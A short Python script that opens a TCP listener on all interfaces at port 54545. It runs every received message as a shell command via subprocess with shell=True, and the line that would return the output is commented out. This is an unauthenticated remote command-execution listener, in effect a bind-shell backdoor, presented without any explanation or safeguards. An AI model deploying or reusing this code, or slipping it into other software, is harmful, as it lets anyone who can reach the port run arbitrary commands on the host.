import socket
import subprocess

def execute_shell_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return str(e.output)

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    print(f"Server listening on {host}:{port}")

    while True:
        connection, address = server_socket.accept()
        print(f"Connection from {address[0]}:{address[1]}")

        message = connection.recv(1024).decode("utf-8")
        print(f"Received message: {message}")

        response = execute_shell_command(message)
        #connection.sendall(response)
        connection.close()

if __name__ == "__main__":
    HOST = ''
    PORT = 54545
    start_server(HOST, PORT)
